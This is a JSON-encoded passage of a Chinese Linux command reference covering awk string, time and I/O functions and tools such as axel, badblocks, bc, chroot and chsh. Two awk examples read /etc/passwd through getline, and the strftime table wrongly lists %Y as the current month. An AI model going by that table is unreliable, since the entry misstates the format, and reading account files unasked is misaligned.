字符开始，截取10个长度字符串\n\n **字符串分割（split使用）** \n\n```\nawk \u0027BEGIN{info\u003d\"this is a test\";split(info,tA,\" \");print length(tA);for(k in tA){print k,tA[k];}}\u0027\n4\n4 test\n1 this\n2 is\n3 a\n```\n\n分割info，动态创建数组tA，这里比较有意思，`awk for …in`循环，是一个无序的循环。 并不是从数组下标1…n ，因此使用时候需要注意。\n\n **格式化字符串输出（sprintf使用）** \n\n格式化字符串格式：\n\n其中格式化字符串包括两部分内容：一部分是正常字符，这些字符将按原样输出; 另一部分是格式化规定字符，以`\"%\"`开始，后跟一个或几个规定字符,用来确定输出内容格式。\n\n\u003ctable width\u003d\"100%\"\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e格式\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%d\u003c/td\u003e\n\n\u003ctd\u003e十进制有符号整数\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%u\u003c/td\u003e\n\n\u003ctd\u003e十进制无符号整数\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%f\u003c/td\u003e\n\n\u003ctd\u003e浮点数\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%s\u003c/td\u003e\n\n\u003ctd\u003e字符串\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%c\u003c/td\u003e\n\n\u003ctd\u003e单个字符\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%p\u003c/td\u003e\n\n\u003ctd\u003e指针的值\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%e\u003c/td\u003e\n\n\u003ctd\u003e指数形式的浮点数\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%x\u003c/td\u003e\n\n\u003ctd\u003e%X 无符号以十六进制表示的整数\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%o\u003c/td\u003e\n\n\u003ctd\u003e无符号以八进制表示的整数\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%g\u003c/td\u003e\n\n\u003ctd\u003e自动选择合适的表示法\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n```\nawk \u0027BEGIN{n1\u003d124.113;n2\u003d-1.224;n3\u003d1.2345; printf(\"%.2f,%.2u,%.2g,%X,%on\",n1,n2,n3,n1,n1);}\u0027\n124.11,18446744073709551615,1.2,7C,174\n```\n\n### 一般函数  \n\n\u003ctable width\u003d\"100%\"\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e格式\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eclose( Expression )\u003c/td\u003e\n\n\u003ctd\u003e用同一个带字符串值的 Expression 参数来关闭由 print 或 printf 语句打开的或调用 getline 函数打开的文件或管道。如果文件或管道成功关闭，则返回 0；其它情况下返回非零值。如果打算写一个文件，并稍后在同一个程序中读取文件，则 close 语句是必需的。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003esystem(command )\u003c/td\u003e\n\n\u003ctd\u003e执行 Command 参数指定的命令，并返回退出状态。等同于 system 子例程。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eExpression | getline [ Variable ]\u003c/td\u003e\n\n\u003ctd\u003e从来自 Expression 参数指定的命令的输出中通过管道传送的流中读取一个输入记录，并将该记录的值指定给 Variable 参数指定的变量。如果当前未打开将 Expression 参数的值作为其命令名称的流，则创建流。创建的流等同于调用 popen 子例程，此时 Command 参数取 Expression 参数的值且 Mode 参数设置为一个是 r 的值。只要流保留打开且 Expression 参数求得同一个字符串，则对 getline 函数的每次后续调用读取另一个记录。如果未指定 Variable 参数，则 $0 记录变量和 NF 特殊变量设置为从流读取的记录。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003egetline [ Variable ] \u003c Expression\u003c/td\u003e\n\n\u003ctd\u003e从 Expression 参数指定的文件读取输入的下一个记录，并将 Variable 参数指定的变量设置为该记录的值。只要流保留打开且 Expression 参数对同一个字符串求值，则对 getline 函数的每次后续调用读取另一个记录。如果未指定 Variable 参数，则 $0 记录变量和 NF 特殊变量设置为从流读取的记录。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003egetline [ Variable ]\u003c/td\u003e\n\n\u003ctd\u003e将 Variable 参数指定的变量设置为从当前输入文件读取的下一个输入记录。如果未指定 Variable 参数，则 $0 记录变量设置为该记录的值，还将设置 NF、NR 和 FNR 特殊变量。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n **打开外部文件（close用法）** \n\n```\nawk \u0027BEGIN{while(\"cat /etc/passwd\"|getline){print $0;};close(\"/etc/passwd\");}\u0027\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\n```\n\n **逐行读取外部文件(getline使用方法）** \n\n```\nawk \u0027BEGIN{while(getline \u003c \"/etc/passwd\"){print $0;};close(\"/etc/passwd\");}\u0027\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\n```\n\n```\nawk \u0027BEGIN{print \"Enter your name:\";getline name;print name;}\u0027\nEnter your name:\nchengmo\nchengmo\n```\n\n **调用外部应用程序(system使用方法）** \n\n```\nawk \u0027BEGIN{b\u003dsystem(\"ls -al\");print b;}\u0027\ntotal 42092\ndrwxr-xr-x 14 chengmo chengmo     4096 09-30 17:47 .\ndrwxr-xr-x 95 root   root       4096 10-08 14:01 ..\n```\n\nb返回值，是执行结果。\n\n### 时间函数  \n\n\u003ctable width\u003d\"100%\"\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e格式\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e函数名\u003c/td\u003e\n\n\u003ctd\u003e说明\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003emktime( YYYY MM dd HH MM ss[ DST])\u003c/td\u003e\n\n\u003ctd\u003e生成时间格式\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003estrftime([format [, timestamp]])\u003c/td\u003e\n\n\u003ctd\u003e格式化时间输出，将时间戳转为时间字符串  \n具体格式，见下表.\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003esystime()\u003c/td\u003e\n\n\u003ctd\u003e得到时间戳,返回从1970年1月1日开始到当前时间(不计闰年)的整秒数\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n **建指定时间(mktime使用）** \n\n```\nawk \u0027BEGIN{tstamp\u003dmktime(\"2001 01 01 12 12 12\");print strftime(\"%c\",tstamp);}\u0027\n2001年01月01日 星期一 12时12分12秒\n```\n\n```\nawk \u0027BEGIN{tstamp1\u003dmktime(\"2001 01 01 12 12 12\");tstamp2\u003dmktime(\"2001 02 01 0 0 0\");print tstamp2-tstamp1;}\u0027\n2634468\n```\n\n求2个时间段中间时间差，介绍了strftime使用方法\n\n```\nawk \u0027BEGIN{tstamp1\u003dmktime(\"2001 01 01 12 12 12\");tstamp2\u003dsystime();print tstamp2-tstamp1;}\u0027 \n308201392\n```\n\n **strftime日期和时间格式说明符** \n\n\u003ctable width\u003d\"100%\"\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e格式\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%a\u003c/td\u003e\n\n\u003ctd\u003e星期几的缩写(Sun)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%A\u003c/td\u003e\n\n\u003ctd\u003e星期几的完整写法(Sunday)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%b\u003c/td\u003e\n\n\u003ctd\u003e月名的缩写(Oct)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%B\u003c/td\u003e\n\n\u003ctd\u003e月名的完整写法(October)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%c\u003c/td\u003e\n\n\u003ctd\u003e本地日期和时间\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%d\u003c/td\u003e\n\n\u003ctd\u003e十进制日期\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%D\u003c/td\u003e\n\n\u003ctd\u003e日期 08/20/99\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%e\u003c/td\u003e\n\n\u003ctd\u003e日期，如果只有一位会补上一个空格\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%H\u003c/td\u003e\n\n\u003ctd\u003e用十进制表示24小时格式的小时\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%I\u003c/td\u003e\n\n\u003ctd\u003e用十进制表示12小时格式的小时\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%j\u003c/td\u003e\n\n\u003ctd\u003e从1月1日起一年中的第几天\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%m\u003c/td\u003e\n\n\u003ctd\u003e十进制表示的月份\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%M\u003c/td\u003e\n\n\u003ctd\u003e十进制表示的分钟\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%p\u003c/td\u003e\n\n\u003ctd\u003e12小时表示法(AM/PM)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%S\u003c/td\u003e\n\n\u003ctd\u003e十进制表示的秒\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%U\u003c/td\u003e\n\n\u003ctd\u003e十进制表示的一年中的第几个星期(星期天作为一个星期的开始)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%w\u003c/td\u003e\n\n\u003ctd\u003e十进制表示的星期几(星期天是0)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%W\u003c/td\u003e\n\n\u003ctd\u003e十进制表示的一年中的第几个星期(星期一作为一个星期的开始)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%x\u003c/td\u003e\n\n\u003ctd\u003e重新设置本地日期(08/20/99)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%X\u003c/td\u003e\n\n\u003ctd\u003e重新设置本地时间(12：00：00)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%y\u003c/td\u003e\n\n\u003ctd\u003e两位数字表示的年(99)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%Y\u003c/td\u003e\n\n\u003ctd\u003e当前月份\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%Z\u003c/td\u003e\n\n\u003ctd\u003e时区(PDT)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%%\u003c/td\u003e\n\n\u003ctd\u003e百分号(%)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n\n"},{"name":"axel","categoryId":0,"data":"axel\n\u003d\u003d\u003d\n\n多线程下载工具\n\n## 补充说明\n\n**axel** 是Linux下一个不错的HTTP/ftp高速下载工具。支持多线程下载、断点续传，且可以从多个地址或者从一个地址的多个连接来下载同一个文件。适合网速不给力时多线程下载提高下载速度。比如在国内VPS或服务器上下载lnmp一键安装包用Axel就比wget快。\n\n### 安装  \n\nCentOS安装Axel：\n\n目前yum源上没有Axel，我们可以到http://pkgs.repoforge.org/axel/下载rpm包安装。\n\n32位CentOS执行下面命令：\n\n```\nwget -c http://pkgs.repoforge.org/axel/axel-2.4-1.el5.rf.i386.rpm\nrpm -ivh axel-2.4-1.el5.rf.i386.rpm\n```\n\n64位CentOS执行下面命令：\n\n```\nwget -c http://pkgs.repoforge.org/axel/axel-2.4-1.el5.rf.x86_64.rpm\nrpm -ivh axel-2.4-1.el5.rf.x86_64.rpm\n```\n\nDebian/Ubuntu安装Axel：\n\n```\napt-get install axel\n```\n\n### 语法  \n\n```\naxel [options] url1 [url2] [url...]\n```\n\n### 选项  \n\n```\n--max-speed\u003dx , -s x         最高速度x\n--num-connections\u003dx , -n x   连接数x\n--output\u003df , -o f            下载为本地文件f\n--search[\u003dx] , -S [x]        搜索镜像\n--header\u003dx , -H x            添加头文件字符串x（指定 HTTP header）\n--user-agent\u003dx , -U x        设置用户代理（指定 HTTP user agent）\n--no-proxy ， -N             不使用代理服务器\n--quiet ， -q                静默模式\n--verbose ，-v               更多状态信息\n--alternate ， -a            Alternate progress indicator\n--help ，-h                  帮助\n--version ，-V               版本信息\n```\n\n### 实例  \n\n如下载lnmp安装包指定10个线程，存到/tmp/：\n\n```\naxel -n 10 -o /tmp/ http://www.jsdig.com/lnmp.tar.gz\n```\n\n如果下载过程中下载中断可以再执行下载命令即可恢复上次的下载进度。\n\n\n"},{"name":"badblocks","categoryId":3,"data":"badblocks\n\u003d\u003d\u003d\n\n查找磁盘中损坏的区块\n\n## 补充说明\n\n**badblock命令** 用于查找磁盘中损坏的区块。 硬盘是一个损耗设备，当使用一段时间后可能会出现坏道等物理故障。电脑硬盘出现坏道后，如果不及时更换或进行技术处理，坏道就会越来越多，并会造成频繁死机和数据丢失。最好的处理方式是更换磁盘，但在临时的情况下，应及时屏蔽坏道部分的扇区，不要触动它们。badblocks就是一个很好的检查坏道位置的工具。\n\n### 语法  \n\n```\nbadblock(选项)(参数)\n```\n\n### 选项  \n\n```\n-b\u003c区块大小\u003e：指定磁盘的区块大小，单位为字节；\n-o\u003c输出文件\u003e：将检查的结果写入指定的输出文件；\n-s：在检查时显示进度；\n-v：执行时显示详细的信息；\n-w：在检查时，执行写入测试。\n```\n\n### 参数  \n\n*   磁盘装置：指定要检查的磁盘装置；\n*   磁盘区块数：指定磁盘装置的区块总数；\n*   启始区块：指定要从哪个区块开始检查。\n\n### 实例  \n\nbadblocks以4096的一个block，每一个block检查16次，将结果输出到“hda-badblocks-list”文件里。\n\n```\nbadblocks -b 4096 -c 16 /dev/hda1 -o hda-badblocks-list\n```\n\nhda-badblocks-list是个文本文件，内容如下：\n\n```\ncat hda-badblocks-list\n51249\n51250\n51251\n51253\n51254\n……\n61245\n……\n```\n\n可以针对可疑的区块多做几次操作。下面，badblocks以4096字节为一个“block”,每一个“block”检查1次, 将结果输出到“hda-badblocks-list.1”文件中，由第51000 block开始，到63000 block结束。\n\n```\nbadblocks -b 4096 -c 1 /dev/hda1 -o hda-badblocks-list.1 63000 51000\n```\n\n这次花费的时间比较短，硬盘在指定的情况下在很短的时间就产生“嘎嘎嘎嘎”的响声。由于检查条件的不同，其输出的结果也不完全是相同的。重复几次同样的操作，因条件多少都有些不同，所以结果也有所不同。进行多次操作后，直到产生最后的hda-badblock-list.final文件。\n\n### 其他  \n\n **1、fsck使用badblocks的信息** \n\nbadblocks只会在日志文件中标记出坏道的信息，但若希望在检测磁盘时也能跳过这些坏块不检测，可以使用fsck的-l参数：\n\n```\nfsck.ext3 -l /tmp/hda-badblock-list.final /dev/hda1\n```\n\n **2、在创建文件系统前检测坏道** \n\nbadblocks可以随e2fsck和mke2fs的-c删除一起运行（对ext3文件系统也一样），在创建文件系统前就先检测坏道信息：\n\n```\nmkfs.ext3 -c /dev/hda1\n```\n\n代码表示使用-c在创建文件系统前检查坏道的硬盘。\n\n这个操作已经很清楚地告知我们可以采用`mkfs.ext3 -c`选项用`read-only`方式检查硬盘。这个命令会在格式化硬盘时检查硬盘，并标出错误的硬盘“block”。用这个方法格式化硬盘，需要有相当大的耐心，因为命令运行后，会一个个用读的方式检查硬盘。\n\n\n"},{"name":"basename","categoryId":0,"data":"basename\n\u003d\u003d\u003d\n\n打印目录或者文件的基本名称\n\n## 补充说明\n\n**basename命令** 用于打印目录或者文件的基本名称。basename和dirname命令通常用于shell脚本中的命令替换来指定和指定的输入文件名称有所差异的输出文件名称。\n\n### 语法  \n\n```\nbasename(选项)(参数)\n```\n\n### 选项  \n\n```\n--help：显示帮助；\n--version：显示版本号。\n```\n\n### 参数  \n\n*   文件：带路径信息的文件；\n*   后缀：可选参数，指定要去除的文件后缀字符串。\n\n### 实例  \n\n1、要显示一个shell变量的基本名称，请输入：\n\n```\nbasename $WORKFILE\n```\n\n此命令显示指定给shell变量WORKFILE的值的基本名称。如果WORKFILE变量的值是`/home/jim/program.c`文件，则此命令显示program.c。\n\n要构造一个和另一个文件名称相同（除了后缀）的文件名称，请输入：\n\n```\nOFILE\u003d`basename $1 .c`.o\n```\n\n此命令指定给 OFILE 文件第一个位置上的参数（$1）的值，但它的 .c 后缀更改至 .o。如果 $1 是 /home/jim/program.c 文件，则 OFILE 成为 program.o。因为 program.o 仅是一个基本文件名称，它标识在当前目录中的文件。\n\n\n"},{"name":"batch","categoryId":0,"data":"batch\n\u003d\u003d\u003d\n\n在系统不繁忙的时候执行定时任务\n\n## 补充说明\n\n**batch命令** 用于在指定时间，当系统不繁忙时执行任务，用法与at相似。\n\n### 语法  \n\n```\nbatch(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：指定包含具体指令的任务文件；\n-q：指定新任务的队列名称；\n-m：任务执行完后向用户发送E-mail。\n```\n\n### 参数  \n\n日期时间：指定任务执行的日期时间。\n\n### 实例  \n\n```\nbatch \nat\u003e echo 1234\nat\u003e \u003cEOT\u003e\njob 5 at Sun Apr 28 08:49:00 2013\n```\n\n\n"},{"name":"bc","categoryId":0,"data":"bc\n\u003d\u003d\u003d\n\n算术操作精密运算工具\n\n## 补充说明\n\n**bc命令** 是一种支持任意精度的交互执行的计算器语言。bash内置了对整数四则运算的支持，但是并不支持浮点运算，而bc命令可以很方便的进行浮点运算，当然整数运算也不再话下。\n\n### 语法  \n\n```\nbc(选项)(参数)\n```\n\n### 选项  \n\n```\n-i：强制进入交互式模式；\n-l：定义使用的标准数学库；\n-w：对POSIX bc的扩展给出警告信息；\n-q：不打印正常的GNU bc环境信息；\n-v：显示指令版本信息；\n-h：显示指令的帮助信息。\n```\n\n### 参数  \n\n文件：指定包含计算任务的文件。\n\n### 实例  \n\n算术操作高级运算bc命令它可以执行浮点运算和一些高级函数：\n\n```\necho \"1.212*3\" | bc \n3.636\n\n```\n\n设定小数精度（数值范围）\n\n```\necho \"scale\u003d2;3/8\" | bc\n0.37\n\n```\n\n参数`scale\u003d2`是将bc输出结果的小数位设置为2位。\n\n进制转换\n\n```\n#!/bin/bash\nabc\u003d192\necho \"obase\u003d2;$abc\" | bc\n\n```\n\n执行结果为：11000000，这是用bc将十进制转换成二进制。\n\n```\n#!/bin/bash\nabc\u003d11000000\necho \"obase\u003d10;ibase\u003d2;$abc\" | bc\n\n```\n\n执行结果为：192，这是用bc将二进制转换为十进制。\n\n计算平方和平方根：\n\n```\necho \"10^10\" | bc\necho \"sqrt(100)\" | bc\n```\n\n\n"},{"name":"bind","categoryId":4,"data":"bind\n\u003d\u003d\u003d\n\n显示或设置键盘按键与其相关的功能\n\n## 补充说明\n\n**bind命令** 用于显示和设置命令行的键盘序列绑定功能。通过这一命令，可以提高命令行中操作效率。您可以利用bind命令了解有哪些按键组合与其功能，也可以自行指定要用哪些按键组合。\n\n### 语法  \n\n```\nbind(选项)\n```\n\n### 选项  \n\n```\n-d：显示按键配置的内容；\n-f\u003c按键配置文件\u003e：载入指定的按键配置文件；\n-l：列出所有的功能；\n-m\u003c按键配置\u003e：指定按键配置；\n-q\u003c功能\u003e：显示指定功能的按键；\n-v：列出目前的按键配置与其功能。\n```\n\n### 实例  \n\n```\nbind -x \u0027\"\\C-l\":ls -l\u0027    #直接按 CTRL+L 就列出目录\n```\n\n其中keyseq可以使用`showkey -a`命令来获取：\n\n```\n[root@localhost ~]# showkey -a\n\nPress any keys - Ctrl-D will terminate this program\n\n^[[A     27 0033 0x1b  上\n         91 0133 0x5b\n         65 0101 0x41\n^[[B     27 0033 0x1b  下\n         91 0133 0x5b\n         66 0102 0x42\n^[[D     27 0033 0x1b  左\n         91 0133 0x5b\n         68 0104 0x44\n^[[C     27 0033 0x1b 右\n         91 0133 0x5b\n         67 0103 0x43\n         32 0040 0x20\n^M       13 0015 0x0d 字母M\n^C        3 0003 0x03 Ctrl-C\n^D        4 0004 0x04 Ctrl-D 退出\n```\n\n\n"},{"name":"chroot","categoryId":4,"data":"chroot\n\u003d\u003d\u003d\n\n把根目录换成指定的目的目录\n\n## 补充说明\n\n**chroot命令** 用来在指定的根目录下运行指令。chroot，即 change root directory （更改 root 目录）。在 linux 系统中，系统默认的目录结构都是以`/`，即是以根 (root) 开始的。而在使用 chroot 之后，系统的目录结构将以指定的位置作为`/`位置。\n\n在经过 chroot 命令之后，系统读取到的目录和文件将不在是旧系统根下的而是新根下（即被指定的新的位置）的目录结构和文件，因此它带来的好处大致有以下3个：\n\n **增加了系统的安全性，限制了用户的权力：** \n\n在经过 chroot 之后，在新根下将访问不到旧系统的根目录结构和文件，这样就增强了系统的安全性。这个一般是在登录 (login) 前使用 chroot，以此达到用户不能访问一些特定的文件。\n\n **建立一个与原系统隔离的系统目录结构，方便用户的开发：** \n\n使用 chroot 后，系统读取的是新根下的目录和文件，这是一个与原系统根下文件不相关的目录结构。在这个新的环境中，可以用来测试软件的静态编译以及一些与系统不相关的独立开发。\n\n **切换系统的根目录位置，引导 Linux 系统启动以及急救系统等：** \n\nchroot 的作用就是切换系统的根位置，而这个作用最为明显的是在系统初始引导磁盘的处理过程中使用，从初始 RAM 磁盘 (initrd) 切换系统的根位置并执行真正的 init。另外，当系统出现一些问题时，我们也可以使用 chroot 来切换到一个临时的系统。\n\n### 语法  \n\n```\nchroot(选项)(参数)\n```\n\n### 选项  \n\n```\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n### 参数  \n\n*   目录：指定新的根目录；\n*   指令：指定要执行的指令。\n\n### 实例  \n\n **将target作为根目录（运行其中的`/bin/sh`）:** \n\n```\nchroot target /bin/sh\n```\n\n这里,target是busybox安装好的路径，类似一个文件系统包含了许多工具。这样，将会进入一个shell界面，这个shell以target为根。运行exit退出该shell又返回原来的本机环境了，也可以使用Ctrl+D。\n\n注意：\n\n*   根用户才行\n*   如果直接chroot target默认寻找target的/bin/bash.这会以target作为根目录\n\n将target作为根目录(运行其中的`/bin/ls`):\n\n```\nchroot target /bin/ls\n```\n\n这里，target是busybox安装好的路径，类似一个文件系统包含了许多工具。这样运行的是target中的ls（不是本机的`/bin/ls`），然后返回立即本机的目录环境。\n\n注意，自己在本地编译一个程序生成a.out之后，拷进`target/bin/`中这样运行却不行,因为它包含了动态连接的库，需要用ldd查看a.out需要那些动态库，将这些库拷贝到新根的对应路径下才能执行。\n\n **用chroot运行自己编译的一个程序：** \n\n准备chroot的根目录：\n\n```\nmkdir newRoot\n```\n\n编译自己的程序：\n\n```\ngcc main.c\n```\n\n这里main.c生成a.out，功能是输出hello。\n\n查看程序需要的库：\n\n```\nldd a.out\n```\n\n输入之后，输出如下：\n\n```\nlinux-gate.so.1 \u003d \u0026gt;  (0xb8034000)\nlibc.so.6 \u003d \u0026gt; /lib/tls/i686/cmov/libc.so.6 (0xb7eab000)\n/lib/ld-linux.so.2 (0xb801a000)\n```\n\n将程序需要的库和程序拷贝到新根目录下：\n\n```\ncp a.out newRoot\nmkdir newRoot/lib\ncp /lib/tls/i686/cmov/libc.so.6 newRoot/lib\ncp /lib/ld-linux.so.2 newRoot/lib\n```\n\n这里newRoot内容将如下：\n\n```\na.out lib/\n```\n\n使用chroot运行自己的程序：\n\n```\nsu\nchroot newRoot /a.out\n```\n\n这样就能够正确运行a.out了，因为a.out使用到了其他的动态连接库，所以需要将库拷贝到newRoot中，如果没有其他库那么直接拷贝a.out就能运行。例如静态编译后的busybox，其安装目录中的`/bin/busybox`就没有依赖其他库。\n\n\n"},{"name":"chsh","categoryId":2,"data":"chsh\n\u003d\u003d\u003d\n\n用来更换登录系统时使用的shell\n\n## 补充说明\n\n**chsh命令** 用来更换登录系统时使用的shell。若不指定任何参数与用户名称，则chsh会以应答的方式进行设置。\n\n### 语法  \n\n```\nchsh(选项)(参数)\n```\n\n### 选项  \n\n```\n-s\u003cshell 名称\u003e或--shell\u003cshell 名称\u003e：更改系统预设的shell环境。；\n-l或--list-shells：列出目前系统可用的shell清单；\n-u或--help：在线帮助；\n-v或-version：显示版本信息。\n```\n\n### 参数  \n\n用户名：要改变默认shell的用户。\n\n### 实例  \n\n **查看系统安装了哪些shell的两种方法：** \n\n第一种：\n\n```\n[rocrocket@localhost ~]$ chsh -l\n/bin/sh\n/bin/bash\n/sbin/nologin\n/bin/zsh\n```\n\n第二种：\n\n```\n[rocrocket@localhost ~]$ cat /etc/shells\n/bin/sh\n/bin/bash\n/sbin/nologin\n/bin/zsh\n```\n\n其实`chsh -l`也是来查看这个文件。\n\n **查看当前正在使用的shell：** \n\n```\n[rocrocket@localhost ~]$ echo $SHELL\n/bin/bash\n```\n\n注意SHELL一定要是大写。可以看到，目前使用的shell是`/bin/bash`\n\n **把我的shell改成zsh：** \n\n```\n[rocrocket@localhost ~]$ chsh -s /bin/zsh\nChanging shell for rocrocket.\nPassword:\nShell changed.\n[rocrocket@localhost ~]$\n```\n\n使用chsh加选项`-s`就可以修改登录的shell了！你会发现你现在执行`echo $SHELL`后仍然输出为`/bin/bash`，这是因为你需要重启你的shell才完全投入到zsh怀抱中去。`chsh -s`其实修改的就是`/etc/passwd`文件里和你的用户名相对应的那一行。现在来查看下：\n\n```\n[rocrocket@localhost ~]$ cat /etc/passwd|grep ^rocrocket\nrocrocket:x:500:500:rocrocket,China:/rocrocket/PSB/home:/bin/zsh\n```\n\n你可以发现输出内容的最后部分已经变成了`/bin/zsh`了，下次重启的时候，linux就会读取这一命令来启动shell了！\n\n **把shell修改回/bin/bash：** \n\n```\n[rocrocket@localhost ~]$ chsh -s /bin/bash\nChanging shell for rocrocket.\nPassword:\nShell changed.\n```\n\n\n"},{"name":"cksum","categoryId":6,"data":"cksum\n\u003d\u003d\u003d\n\n检查文件的CRC是否正确\n\n## 补充说明\n\n**cksum命令** 是检查文件的CRC是否正确，确保文件从一个系统传输到另一个系统的过程中不被损坏。这种方法要求校验和在源系统中被计算出来，在目的系统中又被计算一次，两个数字进行比较，如果校验和相等，则该文件被认为是正确传输了。\n\n注意：CRC是指一种排错检查方法，即循环冗余校验法。\n\n指定文件交由cksum命令进行校验后，会返回校验结果供用户核对文件是否正确无误。若不指定任何文件名称或是所给予的文件名为\"-\"，则cksum命令会从标准输入设备中读取数据。\n\n### 语法  \n\n```\ncksum(选项)(参数)\n```\n\n### 选项  \n\n```\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n### 参数  \n\n文件：指定要计算校验的版本信息。\n\n### 实例  \n\n使用cksum命令计算文件\"testfile1\"的完整性，输入如下命令：\n\n```\ncksum testfile1            #对指定文件进行CRC校验\n```\n\n以上命令执行后，将输出校验码等相关的信息，具体输出信息如下所示：\n\n```\n1263453430 78 testfile1     #输出信息\n```\n\n上面的输出信息中，\"1263453430\"表示校验码，\"78\"表示字节数。\n\n注意：如果文件中有任何字符被修改，都将改变计算后CRC校验码的值。\n\n\n"},{"name":"clear","categoryId":0,"data":"clear\n\u003d\u003d\u003d\n\n清除当前屏幕终端上的任何信息\n\n## 补充说明\n\n**clear命令** 用于清除当前屏幕终端上的任何信息。\n\n### 语法  \n\n```\nclear\n```\n\n### 实例  \n\n直接输入clear命令当前终端上的任何信息就可被清除。\n\n\n"},{"name":"clockdiff","categoryId":0,"data":"clockdiff\n\u003d\u003d\u003d\n\n检测两台linux主机的时间差\n\n## 补充说明\n\n在ip报文的首部和ICMP报文的首部都可以放入时间戳数据。 **clockdiff** 